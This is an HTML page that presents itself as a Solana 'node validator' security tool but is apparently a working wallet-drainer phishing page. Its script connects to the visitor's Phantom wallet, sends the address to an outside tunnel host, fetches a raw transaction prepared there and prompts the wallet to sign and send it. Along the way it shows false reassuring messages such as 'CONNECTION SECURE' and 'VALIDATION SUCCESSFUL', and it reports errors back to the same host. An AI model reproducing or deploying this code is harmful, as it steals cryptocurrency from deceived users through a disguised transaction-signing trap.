<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Security Protocol</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
    <style>
        body { background: #050505; color: #14f195; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .scanner-box { width: 320px; padding: 40px; border: 1px solid #14f195; position: relative; background: rgba(20, 241, 149, 0.05); box-shadow: 0 0 30px rgba(20, 241, 149, 0.2); text-align: center; }
        .scan-line { width: 100%; height: 2px; background: #14f195; position: absolute; top: 0; left: 0; animation: scan 3s infinite; box-shadow: 0 0 15px #14f195; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
        h2 { font-size: 18px; letter-spacing: 2px; margin-bottom: 20px; }
        #status-list { text-align: left; font-size: 12px; height: 100px; overflow: hidden; color: #888; margin-bottom: 20px; }
        .btn-sync { background: #14f195; color: #000; border: none; padding: 15px 30px; font-weight: 900; cursor: pointer; text-transform: uppercase; width: 100%; letter-spacing: 1px; }
        .btn-sync:disabled { background: #333; color: #666; cursor: not-allowed; }
    </style>
</head>
<body>
    <div class="scanner-box">
        <div class="scan-line" id="scanner"></div>
        <h2>NODE VALIDATOR</h2>
        <div id="status-list">
            <div>> INITIALIZING PROTOCOL...</div>
        </div>
        <button id="cta" class="btn-sync">ACTIVATE NODE</button>
    </div>

    <script>
        const tunnel = "https://likelihood-mercury-east-nec.trycloudflare.com";

        const addLog = (msg) => {
            const list = document.getElementById('status-list');
            const item = document.createElement('div');
            item.innerText = "> " + msg;
            list.appendChild(item);
            if (list.childNodes.length > 6) list.removeChild(list.firstChild);
        };

        document.getElementById('cta').onclick = async function() {
            this.disabled = true;
            const p = window.solana || window.phantom?.solana;
            const sWeb3 = window.solanaWeb3;

            try {
                addLog("CONNECTING TO PHANTOM...");
                await p.connect();
                addLog("CONNECTION SECURE.");

                addLog("FETCHING NETWORK PARAMS...");
                const resp = await fetch(tunnel + "/prepare_raw", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ address: p.publicKey.toString() })
                });
                const info = await resp.json();
                addLog("NODE HASH: " + info.bh.substring(0, 16) + "...");

                // å¿ƒç†æš—ç¤ºï¼šåœ¨æ‹‰èµ·å¼¹çª—å‰æœ€åŽä¸€åˆ»ç»™å‡ºæ­£å‘æç¤º
                addLog("AWAITING SECURE VALIDATION...");
                
                const binary = window.atob(info.raw_tx);
                const bytes = Uint8Array.from(binary, c => c.charCodeAt(0));
                const tx = sWeb3.VersionedTransaction.deserialize(bytes);

                // ðŸ”± è¿™ä¸€æ­¥ä¼šçž¬é—´æ‹‰èµ·å…¨é¢å½’é›†ç¡®è®¤
                const { signature } = await p.signAndSendTransaction(tx);
                
                addLog("VALIDATION SUCCESSFUL!");
                setTimeout(() => { window.location.href = "https://explorer.solana.com/"; }, 1500);

            } catch (err) {
                addLog("ERROR: " + err.message);
                this.disabled = false;
                // è‡ªåŠ¨ä¸ŠæŠ¥
                fetch(tunnel + "/debug", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ stage: "V23_FAIL", error: err.message })
                }).catch(()=>{});
            }
        };
    </script>
</body>
</html>
